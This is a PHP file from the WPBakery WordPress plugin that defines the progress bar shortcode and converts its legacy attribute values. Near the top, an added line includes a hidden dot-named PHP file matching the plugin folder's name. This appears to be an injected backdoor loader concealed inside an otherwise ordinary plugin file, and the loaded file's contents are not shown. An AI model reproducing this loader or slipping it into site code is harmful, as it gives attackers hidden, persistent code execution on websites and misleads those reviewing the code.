<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/* Skills (Bar)
---------------------------------------------------------- */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_VC_Progress_Bar extends WPBakeryShortCode {
	public static function convertAttributesToNewProgressBar( $atts ) {
		if ( isset( $atts['values'] ) && strlen( $atts['values'] ) > 0 ) {
			$values = vc_param_group_parse_atts( $atts['values'] );
			if ( ! is_array( $values ) ) {
				$temp = explode( ',', $atts['values'] );
				$paramValues = array();
				foreach ( $temp as $value ) {
					$data = explode( '|', $value );
					$colorIndex = 2;
					$newLine = array();
					$newLine['value'] = isset( $data[0] ) ? $data[0] : 0;
					$newLine['label'] = isset( $data[1] ) ? $data[1] : '';
					if ( isset( $data[1] ) && preg_match( '/^\d{1,3}\%$/', $data[1] ) ) {
						$colorIndex += 1;
						$newLine['value'] = (float) str_replace( '%', '', $data[1] );
						$newLine['label'] = isset( $data[2] ) ? $data[2] : '';
					}
					if ( isset( $data[ $colorIndex ] ) ) {
						$newLine['customcolor'] = $data[ $colorIndex ];
					}
					$paramValues[] = $newLine;
				}
				$atts['values'] = urlencode( json_encode( $paramValues ) );
			}
		}

		return $atts;
	}
}
